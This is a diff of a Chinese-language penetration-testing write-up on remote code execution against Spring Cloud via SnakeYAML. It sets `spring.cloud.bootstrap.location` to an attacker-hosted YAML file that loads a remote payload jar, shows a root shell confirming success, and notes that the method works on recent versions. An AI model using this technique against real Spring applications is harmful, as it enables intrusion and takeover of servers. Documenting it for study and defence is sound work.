@@ -342,12 +342,13 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
 内容：`artsploit.AwesomeScriptEngineFactory`
 
+jar 文件存在到http服务器中
 
 http://10.20.24.191:8090/ymal_payload.jar
 
-`spring.cloud.bootstrap.location=http://10.20.24.191:8090/yaml_payload.yml`
-
 ## 0x01 Set spring.cloud.bootstrap.location
+
+`spring.cloud.bootstrap.location=http://10.20.24.191:8090/yaml_payload.yml`
 
 ![](./location.png)
 ```
@@ -394,6 +395,8 @@ root@kali:/var/www/html# ls /tmp/succ*
 root@kali:/var/www/html# 
 
 ```
+
+Ps: 与Eureka的XStream有效负载相比，yaml的方法甚至可以在最新版本中使用。
 
 ## 参考链接
 
